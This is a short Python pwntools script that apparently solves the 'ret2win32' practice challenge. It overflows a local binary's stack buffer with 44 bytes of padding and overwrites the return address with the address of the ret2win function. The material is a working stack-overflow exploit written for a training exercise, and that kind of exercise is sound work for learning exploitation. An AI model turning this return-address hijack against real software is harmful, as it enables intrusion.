#!/usr/bin/env python

from pwn import *

p = process("./ret2win32")
b = ELF("./ret2win32")

padding = "A"*44
ret2win = p32(b.symbols['ret2win'] + 1)

payload = padding  + ret2win

log.info(payload)

print(p.recvuntil("> "))
p.sendline(payload)

print(p.recvall())
